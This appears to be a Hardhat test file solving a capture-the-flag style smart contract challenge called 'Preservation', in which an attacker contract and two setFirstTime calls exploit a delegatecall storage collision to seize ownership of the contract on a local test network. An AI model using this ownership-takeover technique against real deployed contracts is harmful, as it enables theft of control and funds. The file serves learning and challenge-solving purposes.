import { TransactionResponse } from "@ethersproject/providers"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { expect } from "chai"
import { Contract } from "ethers"
// @ts-ignore
import { ethers } from "hardhat"
import { LibraryContract__factory, PreservationAttacker__factory, Preservation__factory } from "../typechain"

const LIBRARY_NAME = "LibraryContract"
const CONTRACT_NAME = "Preservation"
const CONTRACT_NAME_ATTACKER = "PreservationAttacker"

describe(CONTRACT_NAME, () => {
    let owner, attacker: SignerWithAddress
    let library, library2, preservation, preservationAttacker: Contract
    let tx: TransactionResponse

    it("Should be possible to claim ownership of the instance", async () => {
        [ owner, attacker ] = await ethers.getSigners()

        library = await new LibraryContract__factory(owner).deploy()
        library2 = await new LibraryContract__factory(owner).deploy()

        preservation = await new Preservation__factory(owner).deploy(library.address, library2.address)

        expect(await preservation.owner()).to.be.eq(owner.address)

        preservationAttacker = await new PreservationAttacker__factory(attacker).deploy()

        tx = await preservation.connect(attacker).setFirstTime(preservationAttacker.address)
        await tx.wait()

        expect(await preservation.owner()).to.not.eq(attacker.address)
        expect(await preservation.timeZone1Library()).to.eq(preservationAttacker.address)

        tx = await preservation.connect(attacker).setFirstTime(attacker.address)
        await tx.wait()

        expect(await preservation.owner()).to.eq(attacker.address)
    })
})